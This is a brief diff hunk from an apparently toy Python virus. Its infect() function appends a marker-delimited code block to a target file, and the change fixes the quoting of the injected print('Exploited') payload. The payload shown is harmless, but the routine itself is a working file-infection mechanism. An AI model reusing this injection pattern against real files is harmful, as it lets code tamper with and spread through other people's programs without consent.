@@ -36,7 +36,7 @@ def controllo_file(_file_):
 
 def infect(_file_):
 	exploit_ = "#!Key:Exploit Begin"
-	_exploit = "print(Exploited)"
+	_exploit = "print('Exploited')"
 	_exploit_ = "#!Key:Exploit End"
 	file = open(_file_, 'a')
 	file.write("\n" + exploit_ + "\n" +  _exploit + "\n" +  _exploit_)
